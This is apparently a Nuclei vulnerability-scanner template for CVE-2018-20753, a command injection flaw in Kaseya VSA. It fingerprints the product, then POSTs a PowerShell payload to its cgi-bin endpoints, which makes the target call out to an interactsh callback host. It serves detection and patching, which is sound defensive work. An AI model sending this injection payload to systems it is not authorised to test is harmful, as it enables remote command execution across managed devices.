id: CVE-2018-20753

info:
  name: Kaseya VSA - Command Injection
  author: gyanu2507
  severity: critical
  description: |
    Kaseya VSA RMM before R9.3 9.3.0.35, R9.4 before 9.4.0.36, and R9.5 before 9.5.0.5 contain a command injection vulnerability
    caused by insufficient input validation in PowerShell execution. This allows unprivileged remote attackers to execute arbitrary
    PowerShell payloads on all managed devices. The exploit requires network access to the system.
  impact: |
    An attacker can exploit this vulnerability to execute arbitrary PowerShell commands on all managed devices, potentially leading to
    complete system compromise, data exfiltration, lateral movement, and deployment of malware or ransomware across the entire network.
  remediation: |
    Upgrade Kaseya VSA to R9.3 9.3.0.35 or later, R9.4 9.4.0.36 or later, or R9.5 9.5.0.5 or later. Apply security patches immediately
    and restrict network access to Kaseya VSA servers. Implement network segmentation and monitor for suspicious PowerShell execution.
  reference:
    - https://blog.huntresslabs.com/deep-dive-kaseya-vsa-mining-payload-c0ac839a0e88
    - https://nvd.nist.gov/vuln/detail/CVE-2018-20753
    - https://www.kaseya.com/products/vsa/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2018-20753
    cwe-id: CWE-78
    cpe: cpe:2.3:a:kaseya:vsa:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: kaseya
    product: vsa
    shodan-query: 'http.favicon.hash:-1445519482'
    fofa-query: 'app="Kaseya-VSA"'
  tags: cve,cve2018,kaseya,vsa,command-injection,powershell,rce,kev,vkev,critical

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/vsaas/v2/login"
      - "{{BaseURL}}/Login.aspx"

    matchers:
      - type: dsl
        dsl:
          - 'favicon_hash == -1445519482 || contains(tolower(body), "kaseya") || contains(tolower(body), "vsa") || contains(tolower(body), "kaseya vsa")'
        internal: true

  - method: POST
    path:
      - "{{BaseURL}}/cgi-bin/KUpload.dll"
      - "{{BaseURL}}/cgi-bin/KService.dll"
      - "{{BaseURL}}/cgi-bin/KUpload.exe"
      - "{{BaseURL}}/cgi-bin/KService.exe"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      cmd=Invoke-WebRequest -Uri "http://{{interactsh-url}}" -Method GET; Start-Sleep -Seconds 1

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")'
          - 'status_code == 200 || status_code == 500 || status_code == 400'
        condition: and
